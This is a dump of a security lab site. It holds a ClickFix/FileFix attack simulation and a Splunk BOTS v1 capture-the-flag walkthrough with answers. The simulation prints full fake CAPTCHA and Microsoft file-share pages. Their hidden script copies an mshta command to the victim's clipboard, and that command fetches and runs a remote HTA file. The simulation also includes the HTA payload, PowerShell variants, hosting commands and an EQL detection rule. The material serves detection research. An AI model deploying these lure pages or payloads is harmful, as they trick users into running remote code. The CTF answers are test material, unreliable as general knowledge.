&lt;/div&gt;\n\n    &lt;!-- Footer branding --&gt;\n    &lt;div class=\"footer\"&gt;\n      &lt;img src=\"https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg\" alt=\"Microsoft\"&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n\n  &lt;!-- Hidden payload storage --&gt;\n  &lt;textarea id=\"hiddenPayload\" style=\"position:absolute; left:-9999px;\"&gt;&lt;/textarea&gt;\n\n  &lt;script&gt;\n    const captcha = document.getElementById('captcha');\n    const steps = document.getElementById('steps');\n    const hidden = document.getElementById(\"hiddenPayload\");\n\n    // Function executed when captcha is \"solved\"\n    function solveCaptcha() {\n      const payload = \"mshta.exe http://192.168.1.100/open_calc.hta # \u2705 I am not a robot - Verification ID: 123456 - Press OK\";\n      hidden.value = payload;\n      hidden.select();\n      hidden.setSelectionRange(0, hidden.value.length);\n      const copied = document.execCommand(\"copy\");\n      if (copied) {\n        // Update button appearance to verified state\n        captcha.classList.add(\"checked\");\n        captcha.innerText = \"Finish next steps\";\n      } else {\n        alert(\"Clipboard copy not supported\");\n      }\n    }\n\n    // Attach click event to captcha button\n    captcha.addEventListener(\"click\", solveCaptcha);\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Hosting malicious webpage on Kali <p>Python command to host the malicious HTML files on Kali for the victim client to connect to.</p> <pre><code>$ ls\nclickfix.html   filefix.html    open_calc.hta\n\n$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n</code></pre> <p></p> <p>Simulated ClickFix-style page.</p> <p>??? note \"Hosting malicious webpage on Kali\"     Python command to host the malicious HTML files on Kali for the victim client to connect to.</p> <pre><code>``` bash\n$ ls\nclickfix.html   filefix.html    open_calc.hta\n\n$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n</code></pre> HTML code for simulated FileFix page <p>Embedded code from the 'projects' folder in the GitHub repository. Contains example payload.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;head&gt;\n  &lt;title&gt;A file was shared with you&lt;/title&gt;\n  &lt;style&gt;\n    /* Page layout and base font styling */\n    body {\n      background-color: #f2f2f2;\n      font-family: 'Segoe UI', sans-serif;\n      margin: 0;\n      padding: 40px 0;\n      display: flex;\n      justify-content: center;\n      align-items: flex-start;\n      min-height: 100vh;\n    }\n\n    /* Main centered container */\n    .container {\n      background-color: #ffffff;\n      width: 560px;\n      border-radius: 6px;\n      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);\n      border: 1px solid #dcdcdc;\n      text-align: center;\n    }\n\n    /* Header section containing file info */\n    .header {\n      padding: 40px 30px 10px;\n    }\n\n    .header h2 {\n      font-size: 20px;\n      color: #2f2f2f;\n      margin: 0;\n    }\n\n    /* Timestamp under the header */\n    .timestamp {\n      font-size: 13px;\n      color: #7a7a7a;\n      margin-top: 6px;\n    }\n\n    /* Instructions block for user steps */\n    .instructions {\n      text-align: left;\n      padding: 25px 40px 10px;\n      font-size: 15px;\n      color: #333333;\n      line-height: 1.6;\n    }\n\n    .instructions ol {\n      margin: 0;\n      padding-left: 20px;\n    }\n\n    /* Styled button to simulate verification */\n    #fileExplorer {\n      background-color: #0078d4;\n      color: white;\n      border: none;\n      padding: 12px 30px;\n      font-size: 15px;\n      border-radius: 4px;\n      margin: 30px 0 40px;\n      cursor: pointer;\n    }\n\n    #fileExplorer:hover {\n      background-color: #005ea2;\n    }\n\n    /* Footer section mimicking official styling */\n    .footer {\n      font-size: 11.5px;\n      color: #6b6b6b;\n      background-color: #f7f7f7;\n      padding: 12px 24px;\n      border-top: 1px solid #dcdcdc;\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n    }\n\n    .footer img {\n      height: 16px;\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n  &lt;div class=\"container\"&gt;\n    &lt;!-- File announcement --&gt;\n    &lt;div class=\"header\"&gt;\n      &lt;h2&gt;The file \"HRPolicy.docx\" was made available to you&lt;/h2&gt;\n      &lt;div class=\"timestamp\"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;!-- Step-by-step usage instructions --&gt;\n    &lt;div class=\"instructions\"&gt;\n      &lt;p&gt;To access &lt;strong&gt;HRPolicy.docx&lt;/strong&gt;, validate below and follow the steps:&lt;/p&gt;\n      &lt;ol id=\"steps\"&gt;\n        &lt;li style=\"margin-bottom: 10px;\"&gt;Open File Explorer (&lt;strong&gt;Windows Key + E&lt;/strong&gt;) and select the address bar (&lt;strong&gt;CTRL + L&lt;/strong&gt;)&lt;/li&gt;\n        &lt;li style=\"margin-bottom: 10px;\"&gt;Paste the file path and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;\n      &lt;/ol&gt;\n    &lt;/div&gt;\n\n    &lt;!-- Hidden input to simulate file selection --&gt;\n    &lt;input type=\"file\" id=\"fileInput\" webkitdirectory directory style=\"display:none;\"&gt;\n    &lt;!-- Fake verification button --&gt;\n    &lt;button id=\"fileExplorer\"&gt;Verify that you are not a robot&lt;/button&gt;\n\n    &lt;!-- Footer branding --&gt;\n    &lt;div class=\"footer\"&gt;\n      &lt;img src=\"https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg\" alt=\"Microsoft\"&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n\n  &lt;!-- Hidden textarea for payload injection --&gt;\n  &lt;textarea id=\"hiddenPayload\" style=\"position:absolute; left:-9999px;\"&gt;&lt;/textarea&gt;\n\n  &lt;script&gt;\n    const fileInput = document.getElementById('fileInput');\n    const steps = document.getElementById('steps');\n    const hidden = document.getElementById(\"hiddenPayload\");\n    const fileExplorer = document.getElementById('fileExplorer');\n\n    // On button click, copy payload path to clipboard, then open hidden file input\n    fileExplorer.addEventListener('click', () =&gt; {\n      const payload = \"mshta.exe http://192.168.1.100/open_calc.hta  # C:\\\\company\\\\internal-secure\\\\filedrive\\\\HRPolicy.docx\";\n      hidden.value = payload;\n      hidden.select();\n      hidden.setSelectionRange(0, hidden.value.length);\n      const copied = document.execCommand(\"copy\");\n\n      // File inputs cannot directly launch File Explorer\n      // Hidden file input is clicked to simulate open dialog\n      fileInput.click();\n    });\n\n    // When file input changes, reset and re-trigger after short delay\n    fileInput.addEventListener('change', () =&gt; {\n      alert(\"Please follow the stated instructions.\");\n      fileInput.value = \"\";\n      setTimeout(() =&gt; fileInput.click(), 500);\n    });\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p></p> <p>Simulated FileFix-style page.</p>"},{"location":"projects/security_lab/research/anyfix/#payloads","title":"Payloads","text":"<p>There is a large variety of payloads that can be used for these techniques as can be seen in the reports linked on top of this page. One of the first seen payloads in the wild leveraged .HTA files through Mshta. We will be using those to simulate the attack. The main difference between the \"AnyFix\" variations is the obscurity at the end of the payloads.</p> ClickFixFileFix <p></p> <p>Simulated ClickFix Payload in Windows Run Dialog.</p> <p>Mshta payload</p> <p>Simulates a user pasting a potentially malicious Mshta command into the Windows run dialog, following a typical ClickFix structure to deceive users. This payload will open the Windows calculator application.</p> <pre><code>mshta.exe http://192.168.1.100/open_calc.hta # \u2705 I am not a robot - Verification ID: 123456 - Press OK\n</code></pre> Code for simulated .HTA payload file <p>Embedded code from the 'projects' folder in the GitHub repository. Contains payload to open Windows Calculator.</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;hta:application\n      id=\"OpenCalc\"\n      applicationname=\"OpenCalc\"\n      border=\"thin\"\n      caption=\"yes\"\n      showintaskbar=\"yes\"\n      maximizebutton=\"no\"\n      minimizebutton=\"no\"\n      sysmenu=\"yes\"\n      windowstate=\"normal\" /&gt;\n    &lt;title&gt;Open Calc&lt;/title&gt;\n    &lt;script language=\"VBScript\"&gt;\n      Sub Window_OnLoad()\n        Dim sh\n        Set sh = CreateObject(\"WScript.Shell\")\n        sh.Run \"calc.exe\", 1, False\n        window.Close\n      End Sub\n    &lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>[Extra] Powershell payload</p> <p>Simulates a user pasting a potentially malicious Powershell command into the Windows run dialog, following a typical ClickFix structure to deceive users.</p> <pre><code>powershell Invoke-RestMethod -Uri \"https://www.cloudflare.com\" -Method GET  # \u2705 I am not a robot - Verification ID: 123456 - Press OK\n</code></pre> <p></p> <p>Simulated FileFix Payload in Windows Explorer.</p> <p>Mshta payload</p> <p>Simulates a user pasting a potentially malicious Mshta command into the Windows run dialog, following a typical ClickFix structure to deceive users. This payload will open the Windows calculator application.</p> <pre><code>mshta.exe http://192.168.1.100/open_calc.hta  # C:\\\\company\\\\internal-secure\\\\filedrive\\\\HRPolicy.docx\n</code></pre> Code for simulated .HTA payload file <p>Embedded code from the 'projects' folder in the GitHub repository. Contains payload to open Windows Calculator.</p> <pre><code>\n</code></pre> <p>[Extra] Powershell payload</p> <p>Simulates a user pasting a potentially malicious Powershell command into the Windows Explorer, following a typical FileFix structure to deceive users.</p> <pre><code>powershell Invoke-RestMethod -Uri \"https://www.cloudflare.com\" -Method GET  # C:\\\\company\\\\internal-secure\\\\filedrive\\\\HRPolicy.docx\n</code></pre>"},{"location":"projects/security_lab/research/anyfix/#logs","title":"Logs","text":""},{"location":"projects/security_lab/research/anyfix/#host","title":"Host","text":"<p>Both simulations generated over 250 logs, primarily from Sysmon due to our detailed tracing configuration. The logs from both simulations are very similar, as expected from their parallel attack paths. The key difference lies in the specific registry keys that are modified.</p> <p></p> <p>Summary of logs generated by ClickFix simulation. Results are similar for FileFix. </p> ClickFixFileFix <p>Elastic Defend only captured events related to the calculator process starting. It did not capture any RunMRU registry changes. This may be due to default policy configurations that do not monitor this specific registry key for changes. This highlights a potential visibility gap in some EDR solutions.  </p> <p></p> <p>Limited logs generated by Elastic Agent.</p> <p>Sysmon, with an appropriate configuration (see architecture), provided full visibility into the attack chain. It logged the network connection to the malicious HTML page, the subsequent process events, and the modification of the registry. The <code>RunMRU</code> key will contain the payload when a command is executed from the Windows Run dialog.</p> <p></p> <p>Logs generated by Sysmon (filtered for relevance).</p> <p>Similar to the ClickFix simulation, Elastic Defend only captured the calculator process events. Sysmon, however, covered the full attack chain. For FileFix, the interesting registry artifact is the modification of the <code>TypedPaths</code> key, which is updated when a path is entered into the File Explorer address bar when Windows Explorer is opened through a browser (not via <code>CTRL+E</code>).</p> <p></p> <p>Logs generated by Sysmon specific to registry changes during the FileFix attack chain.</p>"},{"location":"projects/security_lab/research/anyfix/#detection-hunting","title":"Detection &amp; Hunting","text":"<p>None of the default Elastic rules were triggered during the simulated attack sequence. This underscores the evasive nature of user-initiated execution.</p> <p>Elastic has published an Elastic Defend detection rule for similar behavior. Below is an adapted version of the EQL query that can be used for creating a detection rule or for threat hunting in Kibana. The original query has been modified to include our findings and remove fields that may not be populated in all environments.</p> <p>Also see the custom detection rule published in the repository. </p> [CUSTOM] [EQL] Execution of Suspicious Commands in Combination with AnyFix Registry Entry<pre><code>sequence by host.id with maxspan=1m\n  [ \n/* (1)! */ process where (event.action == \"start\" or event.action == \"Process creation\") and\n/* (2)! */ process.name : (\"cmd.exe\", \"powershell.exe\", \"curl.exe\", \"msiexec.exe\", \"mshta.exe\", \"wscript.exe\", \"cscript.exe\") and\n/* (3)! */ process.parent.name : (\"explorer.exe\", \"msedge.exe\") and \n/* (4)! */ process.args_count &gt;= 2 ]\n/* (5)! */  [ registry where event.action == \"RegistryEvent (Value Set)\" and\n    registry.path : (\"*RunMRU*\", \"*TypedPaths*\") and\n    registry.data.strings : (\"*cmd*\", \"*powershell*\", \"*curl*\", \"*mshta*\") ]\n</code></pre> <ol> <li>Event action filter: Include process creation events (Elastic Defend and Symon respectively).</li> <li>Process name filter: Include high-risk or commonly abused executables used in AnyFix attacks.</li> <li>Parent process filter: Restrict to processes launched by Explorer (user-initiated) or a browser (add more browser executables when needed).</li> <li>Argument count filter: Only include processes with two or more arguments, indicating significant execution.</li> <li>Registry modification: RunMRU (ClickFix) or TypedPaths (FileFix) registry keys written to then process starts.</li> </ol>"},{"location":"writeups/","title":"Overview","text":""},{"location":"writeups/#overview","title":"Overview","text":"<p>I occassionally participate in a capture the flag (CTF) events. I attempt to create write-ups for these to formally store the knowledge and support others looking for answers. </p>"},{"location":"writeups/hhc/","title":"SANS Holiday Hack Challenge","text":""},{"location":"writeups/hhc/#sans-holiday-hack-challenge","title":"SANS Holiday Hack Challenge","text":"<p>The SANS training institute organizes an annual CTF during the winter holiday season. It is free of charge and played in form of an online multiplayer rpg-like game including a world to walk around freely where you can meet your peers, NPCs with dialogue, and a storyline, making it a unique CTF.</p> <p>I have completed this CTF on multiple occassions. For some of them, I have created a write-up.</p> <ul> <li>2022: completed but no writeup available.</li> <li>2024: complete write-up. My submission was selected as 'super-honorable mention' by SANS.</li> </ul>"},{"location":"writeups/splunk_bots/","title":"Splunk Boss of the SOC (BOTS)","text":""},{"location":"writeups/splunk_bots/#splunk-boss-of-the-soc-bots","title":"Splunk Boss of the SOC (BOTS)","text":""},{"location":"writeups/splunk_bots/#introduction","title":"Introduction","text":"<p>Splunk Boss of the SOC (BOTS) was a competitive, capture-the-flag\u2013style event focused on security operations center skills. Participants investigate simulated security incidents using Splunk data to identify threats, analyze attacks, and answer challenge questions. It is designed to test threat detection, incident response, and data analysis capabilities in realistic, hands-on scenarios.</p> <p>Since most CTFs have an offensive focus, Splunk BOTS is a refreshing alternative. They were organized through 2016 until 2019 (four editions). They still host various challenges on their website, including the first edition. Edition two and three can be found on GitHub. </p> <p>I first learned about Splunk BOTS during a FIRST Technical Colloquium talk given by ex-employees and decided to give it a go myself. </p> <p>Info</p> <p>The answers should adhere to Splunk tips and tricks as listed on my Splunk cheatsheet. </p>"},{"location":"writeups/splunk_bots/#bots-v1-2015","title":"BOTS V1 (2015)","text":"<p>An overview of data sourcetypes and download link for the dataset can be found on GitHub. </p>"},{"location":"writeups/splunk_bots/#scenario-1-web-site-defacement","title":"Scenario 1: Web site defacement","text":"<p>Context</p> <p>Today is Alice's first day at the Wayne Enterprises' Security Operations Center. Lucius sits Alice down and gives her first assignment: A memo from Gotham City Police Department (GCPD). Apparently GCPD has found evidence online (http://pastebin.com/Gw6dWjS9) that the website www.imreallynotbatman.com hosted on Wayne Enterprises' IP address space has been compromised. The group has multiple objectives... but a key aspect of their modus operandi is to deface websites in order to embarrass their victim. Lucius has asked Alice to determine if www.imreallynotbatman.com. (the personal blog of Wayne Corporations CEO) was really compromised.</p> Question 101 <p>Question</p> <p>What is the likely IPv4 address of someone from the Po1s0n1vy group scanning imreallynotbatman.com for web application vulnerabilities?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" \"imreallynotbatman.com\"\n</code></pre> <p>Look for the domain as raw term in the HTTP logs. Using the sidebar we can see that only two source IPs are present in the results. We can quickly identify that one IP is sending suspicious requests: 40.80.148.42. </p> Question 102 <p>Question</p> <p>What company created the web vulnerability scanner used by Po1s0n1vy? Type the company name.</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" src_ip=\"40.80.148.42\" \"imreallynotbatman.com\"\n</code></pre> <p>Look at HTTP requests coming from the malicious IP address. In the headers of the requests (<code>src_headers</code>) we find the product: Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition). </p> Question 103 <p>Question</p> <p>What content management system is imreallynotbatman.com likely using?</p> <p>Using the same query as that for question 102 we can see that many of the URIs attacked contain <code>/joomla/</code>. A Google search reveals that this is a CMS and therefore the answer: joomla. </p> Question 104 <p>Question</p> <p>What is the name of the file that defaced the imreallynotbatman.com website? Please submit only the name of the file with extension?</p> Query<pre><code>index=botsv1 sourcetype=\"fgt_utm\" src=\"192.168.250.70\" \n</code></pre> <p>The FortiGate firewalls have the unified threat management (UTM) feature enabled. This index will contain incoming and outgoing analyzed traffic (WAF/IDS-like). We look for events coming from the webserver itself as the attacker likely compromised it before defacing it and pulled the image from somewhere else. We find the webserver IP using the query in question 102. The answer we find is: poisonivy-is-coming-for-you-batman.jpeg. </p> Question 105 <p>Question</p> <p>This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?</p> <p>Using the same event that provided we answer for 104 we find: prankglassinebracket.jumpingcrab.com. </p> Question 106 <p>Question</p> <p>What IPv4 address has Po1s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?</p> <p>Using the same event that provided we answer for 104 and 105 we find: 23.22.63.114. </p> Question 108 <p>Question</p> <p>What IPv4 address is likely attempting a brute force password attack against imreallynotbatman.com?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST src_ip=\"23.22.63.114\"\n</code></pre> <p>From question 101 we know that there are two IPs connecting to the webserver, of which one is a vulnerability scanner. While the attacker could conduct a brute-force attack from this IP, we see the brute-force attempts when analyzing traffing from the other one ('src_content'). Therefore, the answer is: 23.22.63.114.</p> Question 109 <p>Question</p> <p>What is the name of the executable uploaded by Po1s0n1vy? </p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST \"upload\" \".exe\"\n</code></pre> <p>Build a query that looks for HTTP traffic with the webserver as destination IP, HTTP method POST, and containing references to uploading and Windows executables. This returns a single event regarding an upload. This executable appears to be: 3791.exe. </p> Question 110 <p>Question</p> <p>What is the MD5 hash of the executable uploaded?</p> Query<pre><code>index=botsv1 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 process=\"3791.exe\" \"3791.exe\"\n</code></pre> <p>Sysmon will have recorded this when the executable was launched (event code 1). Look for the executable using both a raw term search as it can appear in multiple fields and in the process field. This query is much quicker than when not supplying the raw term. The hash we find is: AAE3F5A29935E6ABCC2C2754D12A9AF0. </p> Question 111 <p>Question</p> <p>GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the Po1s0n1vy APT group, if initial compromise fails, is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to Po1s0n1vys initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.</p> <p>We leverage VirusTotal to look for relationships of the attacker infrastructure 23.22.63.114. Under 'Communicating Files' there are four likely malicious files listed. One of them has an ominous looking name that could be used in a spearsphing attack called <code>MirandaTateScreensaver.src.exe</code>. The SHA256 hash of this file is: 9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8. </p> Question 112 <p>Question</p> <p>What special hex code is associated with the customized malware discussed in question 111?</p> <p>The VirusTotal page for the malware found in question 111 contains comments. The first comment from 'ryan_kovar' contains a hex string: 53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21 </p> <p>This translates to <code>Steve Brant's Beard is a powerful thing. Find this message and ask him to buy you a beer!!!</code>. </p> Question 114 <p>Question</p> <p>What was the first brute force password used?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST src_ip=\"23.22.63.114\" | tail 1\n</code></pre> <p>Look for all brute-force attempts and filter out the first one. The password shown in <code>form_data</code> is: 12345678. </p> Question 115 <p>Question</p> <p>One of the passwords in the brute force attack is James Brodsky's favorite Coldplay song. We are looking for a six character word on this one. Which is it?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST src_ip=\"23.22.63.114\" \n| rex field=src_content \"(?:^|&amp;)passwd=(?P&lt;password&gt;[^&amp;]+)\" \n| eval length=len(password) \n| table password, length \n| where length=6\n</code></pre> <p>Again look for all brute-force attempts and extract the password used from the <code>src_content</code> field using regex. We can filter on the field name <code>passwd</code> and take all characters until the next <code>&amp;</code> delimiter. We then compute the length of the password and create a table with only password with a length of six. Using some common Coldplay knowledge, we identify the password with the name of a Coldplay song: yellow.</p> AI usage <p>The regex was created with help of ChatGPT and summarized as follows:</p> <ol> <li> <p><code>(?:^|&amp;)</code> Non-capturing group. Matches either the beginning of the string (<code>^</code>) or an ampersand (<code>&amp;</code>). Ensures we only match when <code>passwd=</code> is a standalone parameter and not a substring inside another value.</p> </li> <li> <p><code>passwd=</code> Literal match for the field name.</p> </li> <li> <p><code>(?P&lt;password&gt;[^&amp;]+)</code> Named capturing group called <code>password</code>. Captures one or more characters (<code>+</code>) that are not an ampersand (<code>[^&amp;]</code>). This ensures the captured value ends before the next delimiter.</p> </li> </ol> Question 116 <p>Question</p> <p>What was the correct password for admin access to the content management system running \"imreallynotbatman.com\"?</p> Query<pre><code>index=botsv1 dest_ip=\"192.168.250.70\" sourcetype=\"stream:http\" http_method=POST form_data=\"*passwd*\" form_data=\"*username=admin*\" src_ip=\"40.80.148.42\"\n</code></pre> <p>The data from the brute-force IP does not show an obvious candidate. However, when swapping out the IP with the vulnerability scanner we find a single event with the correct password: batman. </p> Question 117 <p>Question</p> <p>What was the average password length used in the password brute forcing attempt?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST src_ip=\"23.22.63.114\" \n| rex field=src_content \"(?:^|&amp;)passwd=(?P&lt;password&gt;[^&amp;]+)\" \n| eval length=len(password) \n| table password, length \n| stats avg(length)\n</code></pre> <p>We reuse the query used for question 115 and now compute the average length. This returns (rounded down): 6. </p> Question 118 <p>Question</p> <p>How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login? </p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST form_data=\"*batman*\" \n| sort _time \n| streamstats current=f last(_time) as prev_time \n| eval diff_seconds=_time - prev_time\n</code></pre> <p>We look for requests containing the password <code>batman</code>. The query returns two events; the brute-force attempt and the actual login. We can compute the time in seconds as <code>diff_seconds</code> between these two events: 92.17. </p> AI usage <p>ChatGPT came up with the computation of the difference in time directly in the query using <code>streamstats</code>, which it explained as follows:</p> <p><code>streamstats</code> processes events as they stream in, maintaining state across rows.</p> <ul> <li><code>current=f</code> prevents including the current row in the calculation, so only past rows are referenced.</li> <li><code>last(_time) as prev_time</code> stores the previous event\u2019s <code>_time</code> value in a new field <code>prev_time</code>.</li> <li>Each event gets paired with the immediately preceding event\u2019s time, enabling <code>eval</code> to compute their difference.</li> </ul> Question 119 <p>Question</p> <p>How many unique passwords were attempted in the brute force attempt?</p> Query<pre><code>index=botsv1 sourcetype=\"stream:http\" dest_ip=\"192.168.250.70\" http_method=POST src_ip=\"23.22.63.114\" \n| rex field=src_content \"(?:^|&amp;)passwd=(?P&lt;password&gt;[^&amp;]+)\" \n| stats values(password)\n</code></pre> <p>We again reuse the query and compute all the unique passwords: 412.  </p>"},{"location":"writeups/splunk_bots/#scenario-2-ransomware","title":"Scenario 2: Ransomware","text":"<p>Context</p> <p>After the excitement of yesterday, Alice has started to settle into her new job. Sadly, she realizes her new colleagues may not be the crack cybersecurity team that she was led to believe before she joined. Looking through her incident ticketing queue she notices a \u201ccritical\u201d ticket that was never addressed. Shaking her head, she begins to investigate. Apparently on August 24th Bob Smith (using a Windows 10 workstation named we8105desk) came back to his desk after working-out and found his speakers blaring (click below to listen), his desktop image changed (see below) and his files inaccessible.</p> <p>Alice has seen this before... ransomware. After a quick conversation with Bob, Alice determines that Bob found a USB drive in the parking lot earlier in the day, plugged it into his desktop, and opened up a word document on the USB drive called \"Miranda_Tate_unveiled.dotm\". With a resigned sigh she begins to dig into the problem...</p> Question 200 <p>Question</p> <p>What was the most likely IPv4 address of we8105desk on 24AUG2016? </p> Query<pre><code>index=\"botsv1\" host=\"we8105desk\"\n</code></pre> <p>Filter for the hostname using the indexed field and look for the most frequent source IP in the sidebar. This will be: 192.168.250.100.</p> Question 201 <p>Question</p> <p>Amongst the Suricata signatures that detected the Cerber malware, which one alerted the fewest number of times? Submit ONLY the signature ID value as the answer.</p> Query<pre><code>index=\"botsv1\" sourcetype=\"suricata\" src_ip=\"192.168.250.100\" \"Cerber\"\n</code></pre> <p>Filter for logs generated by suricata containing the IP mentioned in the last question, and containing the malware name (this query could be optimized by searching in specific fields). Use the sidebar to locate the ID, which will be: 2816763. </p> Question 202 <p>Question</p> <p>What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?</p> <p>We can reuse the query on Suricata data of question 201 to get the time range we need to look for in DNS data. We run the query and click on the time field of the latest result. Splunk will then prompt to set a time range based on that time. We choose to set it to look for events 5 minutes before and after. We can then run this next query to summarize the DNS queries run from the workstation in that timeframe:</p> Query<pre><code>index=\"botsv1\" sourcetype=\"stream:dns\" src_ip=\"192.168.250.100\" | stats count by query\n</code></pre> <p>There are six unique DNS queries of which one is the obviously malicious one: cerberhhyed5frqa.xmfir0.win.</p> Question 203 <p>Question</p> <p>What was the first suspicious domain visited by we8105desk on 24AUG2016?</p> Query<pre><code>index=\"botsv1\" sourcetype=\"stream:dns\" src_ip=\"192.168.250.100\" earliest=\"08/24/2016:0:0:0\" latest=\"08/24/2016:23:59:59\" | reverse | table _time, query\n</code></pre> <p>Run a query on the DNS data with the correct time range. The IP address is searched with a raw term search as the <code>host_addr</code> field needed is an array and thus doesn't search easily. The query formats the output into a table that is sorted on ascending time. On page nine the suspicious domain is found: solidaritedeproximite.org.</p> Question 204 <p>Question</p> <p>During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length of the value of this field?</p> Query<pre><code>index=\"botsv1\" sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" dvc_nt_host=\"we8105desk\" \".vbs\" | eval length=len(cmdline) | table _time, CommandLine,length | reverse\n</code></pre> <p>Sysmon data will include the VB script. Look for anything related to <code>.vbs</code> and compute the cmdline length. We then use a table to display the results in ascending order. Don't forget to reset the time range to all time after answering the questions before.</p> <p>We find ten different command lines. The first suspicious one has a length of: 4490.</p> Question 205 <p>Question</p> <p>What is the name of the USB key inserted by Bob Smith?</p> Query<pre><code>index=\"botsv1\" host=\"we8105desk\" sourcetype=\"winregistry\" \"usbstor\" | stats values(data)\n</code></pre> <p>The WinEvent logs provided (<code>application</code>, <code>security</code>, and <code>system</code> as per the GitHub repository) lack the needed <code>operational</code> channel to look for USB events. We do have the winregistry events at our disposal. USB devices are added to the <code>USBSTOR</code> in the registry. We look for this term and look at the unique data values that are being set. The query returns many typical Windows registry terms and IDs except a suspicious name: MIRANDA_PRI. </p> Question 206 <p>Question</p> <p>Bob Smith's workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IPv4 address of the file server?</p> Query<pre><code>index=\"botsv1\" sourcetype=\"stream:smb\" src_ip=\"192.168.250.100\" | stats count by dest_ip\n</code></pre> <p>Look for SMB traffic coming from the workstation and identify the IP connected most often to: 192.168.250.20. </p> Question 207 <p>Question</p> <p>How many distinct PDFs did the ransomware encrypt on the remote file server? </p> Query<pre><code>index=\"botsv1\" sourcetype=\"WinEventLog:Security\" host=\"we9041srv\" Accesses=DELETE \".pdf\" | stats values(Relative_Target_Name)\n</code></pre> <p>We can identify the hostname of the file server (<code>we9041srv</code>) by reversing the trick used for question 200. Then look for deletion of PDF files and count the unique events: 257.</p> Question 208 <p>Question</p> <p>The VBscript found in question 204 launches 121214.tmp. What is the ParentProcessId of this initial launch?</p> Query<pre><code>index=\"botsv1\" sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"we8105desk\" EventCode=1 \"121214.tmp\" \".vbs\"\n</code></pre> <p>Look for process start events with both terms. We find the parent process ID is: 3968. </p> Question 209 <p>Question</p> <p>The Cerber ransomware encrypts files located in Bob Smith's Windows profile. How many .txt files does it encrypt?</p> Query<pre><code>index=\"botsv1\" host=\"we8105desk\" sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=2 TargetFilename=\"C:\\\\Users\\\\bob.smith.WAYNECORPINC\\\\*\" TargetFilename=\"*.txt\"\n</code></pre> <p>Count the Sysmon events that involve file creation with the target including the user profile and the file extension, resulting in the number of encrypted files: 406.</p> Question 210 <p>Question</p> <p>The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file? </p> Query<pre><code>index=\"botsv1\" sourcetype=\"suricata\" dest_ip=\"192.168.250.100\" | table fileinfo.filename, fileinfo.size | sort -fileinfo.size\n</code></pre> <p>Look for all file names and sizes with the infected workstation as destination. A ransomware executable will typically be larger than other files so we sort the results by size. The top result immediately stands out as it's a relatively large JPG file with a suspicious name: mhtr.jpg. </p> Question 211 <p>Question</p> <p>Now that you know the name of the ransomware's encryptor file, what obfuscation technique does it likely use?</p> <p>The technique to hide data in files such as images is typically called: steganography. </p>"}]}